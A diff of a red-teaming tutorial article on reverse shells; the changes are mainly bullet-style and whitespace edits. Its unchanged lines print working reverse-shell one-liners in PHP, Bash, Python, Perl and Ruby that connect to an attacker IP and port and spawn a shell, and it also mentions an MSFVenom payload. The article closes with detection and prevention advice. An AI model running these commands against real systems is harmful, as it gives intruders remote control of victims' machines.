@@ -1,5 +1,6 @@
 :orphan:
 (perform-remote-code-execution-with-the-use-of-reverse-shells)=
+
 # Perform Remote Code Execution with the Use of Reverse Shells
 
 Reverse shells are frequently used in red team assessments to test your organization's IT infrastructure defense mechanisms. This article will go over the specifics of unique sort of a remote shell known as the reverse shell.
@@ -104,8 +105,8 @@ If your target webserver uses the PHP programming language, you can use PHP to c
 
 `php -r '$socket=fsockopen("10.0.0.2",31337);exec("/bin/sh -i <&3 >&3 2>&3");'`
 
-* The fsockopen function establishes a socket connection with the specified IP address and port number and saves the handle in the $socket variable. 
-* The exec function takes the input from this stream, executes it, and writes the output to it.
+- The fsockopen function establishes a socket connection with the specified IP address and port number and saves the handle in the $socket variable.
+- The exec function takes the input from this stream, executes it, and writes the output to it.
 
 <u>3. Bash Reverse Shell:</u>
 
@@ -113,19 +114,19 @@ We can also use bash to construct reverse shells and connect to the target machi
 
 `bash -i >& /dev/tcp/10.0.0.2/31337 0>&1`
 
-* /dev/tcp/IP address/Port number is used to create a tcp socket connection on the given IP address and port number.
-* bash -i is used to create an interactive bash session on this tcp connection. It executes the commands that the server sends and writes the results to the stream.
+- /dev/tcp/IP address/Port number is used to create a tcp socket connection on the given IP address and port number.
+- bash -i is used to create an interactive bash session on this tcp connection. It executes the commands that the server sends and writes the results to the stream.
 
 <u>4. Python Reverse Shell:</u>
 
-Reverse shells are also made with Python. The code below produces a reverse shell for the Linux operating system in python. 
+Reverse shells are also made with Python. The code below produces a reverse shell for the Linux operating system in python.
 
 `python -c 'import socket,subprocess,os;sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM);sock.connect(("10.0.0.2",31337));os.dup2(sock.fileno(),0); os.dup2(sock.fileno(),1); os.dup2(sock.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
 
-* This code is using the socket library in python. The socket.socket method is used to create a socket handle and store it in the sock variable.
-* The socket library's connect method is then used to establish a TCP socket connection with the server's IP address and port number.
-* The file descriptor of the socket we just constructed is referred to by sock.fileno(). Standard input, output, and error are denoted by the numbers 0, 1, and 2. The os.dup2 function copies the file descriptor of the socket to the STDIN, STDOUT, and STDERR file descriptors.
-* The bash process now uses the socket file descriptor to read the input from the server, execute it and write the output to the stream.
+- This code is using the socket library in python. The socket.socket method is used to create a socket handle and store it in the sock variable.
+- The socket library's connect method is then used to establish a TCP socket connection with the server's IP address and port number.
+- The file descriptor of the socket we just constructed is referred to by sock.fileno(). Standard input, output, and error are denoted by the numbers 0, 1, and 2. The os.dup2 function copies the file descriptor of the socket to the STDIN, STDOUT, and STDERR file descriptors.
+- The bash process now uses the socket file descriptor to read the input from the server, execute it and write the output to the stream.
 
 <u>5. Perl Reverse Shell:</u>
 
@@ -133,10 +134,10 @@ This is an example of a reverse shell created using Perl language that uses a Li
 
 `perl -e 'use Socket;$ip="10.0.0.2";$port=31337;socket(sock,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(sock,sockaddr_in($port,inet_aton($ip)))){open(STDIN,">&sock");open(STDOUT,">&sock");open(STDERR,">&sock");exec("/bin/sh -i");};'`
 
-* This code uses the Socket function in Perl to create a TCP socket connection on the given server IP address and port number.
+- This code uses the Socket function in Perl to create a TCP socket connection on the given server IP address and port number.
 
-* It then associates the socket's handle(sock variable) with the STDIN, STDOUT, and STDERR (standard input, output, and error) using the open function. 
-* The bash process now uses the socket file descriptor to read the input from the server, execute it and write the output to the stream.
+- It then associates the socket's handle(sock variable) with the STDIN, STDOUT, and STDERR (standard input, output, and error) using the open function.
+- The bash process now uses the socket file descriptor to read the input from the server, execute it and write the output to the stream.
 
 <u>6. Ruby Reverse Shell:</u>
 
@@ -144,8 +145,8 @@ You can also create a reverse shell using Ruby. This example creates a reverse s
 
 `ruby -rsocket -e'h=TCPSocket.open("10.0.0.2",31337).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",h,h,h)'`
 
-* This code uses Ruby's TCPSocket library to create a tcp socket connection on the given IP address and port number. The socket handle is stored in variable h.
-* The shell now reads incoming commands from the stream, executes them, and writes the output to the stream using the socket handle.
+- This code uses Ruby's TCPSocket library to create a tcp socket connection on the given IP address and port number. The socket handle is stored in variable h.
+- The shell now reads incoming commands from the stream, executes them, and writes the output to the stream using the socket handle.
 
 <u>7. MSFVenom:</u>
 
@@ -164,7 +165,7 @@ Let's assume that the attacker delivers the payload file (revshell_x64.exe) to t
 
 Reverse shells can be difficult to detect, especially if they use protocols that are permitted on the network.
 
-Reverse shells can be identified by monitoring the flow of traffic in your network and looking for suspicious activity in your logs. One of the tools that can help you detect reverse shells, is an IDS(intrusion detection system). There are two kinds of IDS, signature-based IDS and behavior-based/anomaly-based IDS. 
+Reverse shells can be identified by monitoring the flow of traffic in your network and looking for suspicious activity in your logs. One of the tools that can help you detect reverse shells, is an IDS(intrusion detection system). There are two kinds of IDS, signature-based IDS and behavior-based/anomaly-based IDS.
 
 Based on their pattern, signature-based intrusion detection systems may detect the most widely used reverse shells.
 
@@ -178,22 +179,22 @@ Even the most sophisticated techniques, however, cannot ensure 100% detection of
 
 As stated in the preceding section, complete detection of the reverse shell in your network is impossible. To secure your network and endpoints, the best security strategy is to prevent them from happening in the first place. This section describes several techniques for preventing reverse shell attacks in your network.
 
-* Security issues in web applications that could lead to reverse shell exploitation should be extensively examined. Manual testing, as well as automated tools such as vulnerability scanners, must be used on a regular basis to help detect and prevent these vulnerabilities.
+- Security issues in web applications that could lead to reverse shell exploitation should be extensively examined. Manual testing, as well as automated tools such as vulnerability scanners, must be used on a regular basis to help detect and prevent these vulnerabilities.
 
-* Employee security awareness and training sessions should be held on a regular basis. Your trusted company network and workstations are used by your staff. They must be educated on the most recent attacker methods and how to spot them.
+- Employee security awareness and training sessions should be held on a regular basis. Your trusted company network and workstations are used by your staff. They must be educated on the most recent attacker methods and how to spot them.
 
-* Filter your network's outbound connections. There must be a proxy server between your internal network and the internet that thoroughly inspects the network packets and blocks any suspicious traffic.
+- Filter your network's outbound connections. There must be a proxy server between your internal network and the internet that thoroughly inspects the network packets and blocks any suspicious traffic.
 
-* Implement the security hardening of your web server by disabling all unnecessary software, interpreters, services, ports, and connections. Implement strict access control and extensive logging capabilities.
+- Implement the security hardening of your web server by disabling all unnecessary software, interpreters, services, ports, and connections. Implement strict access control and extensive logging capabilities.
 
-* All endpoints should be set up to update anti-virus software automatically. It should not be possible for users to disable anti-virus software on their computers.
+- All endpoints should be set up to update anti-virus software automatically. It should not be possible for users to disable anti-virus software on their computers.
 
-* Users should not be given administrative privileges on their workstations.
+- Users should not be given administrative privileges on their workstations.
 
-* Implement network segregation to minimize lateral movement of the attacker within your network.
+- Implement network segregation to minimize lateral movement of the attacker within your network.
 
-* To efficiently detect abnormal network activity, use an anomaly-based NIDS (network intrusion detection system).
+- To efficiently detect abnormal network activity, use an anomaly-based NIDS (network intrusion detection system).
 
-* Do not allow the executable files from unknown sources to run on the computer.
+- Do not allow the executable files from unknown sources to run on the computer.
 
 > **Looking to expand your knowledge of red teaming? Check out our online course, [MRT - Certified Red Teamer](https://www.mosse-institute.com/certifications/mrt-certified-red-teamer.html). In this course, you'll learn about the different aspects of red teaming and how to put them into practice.**
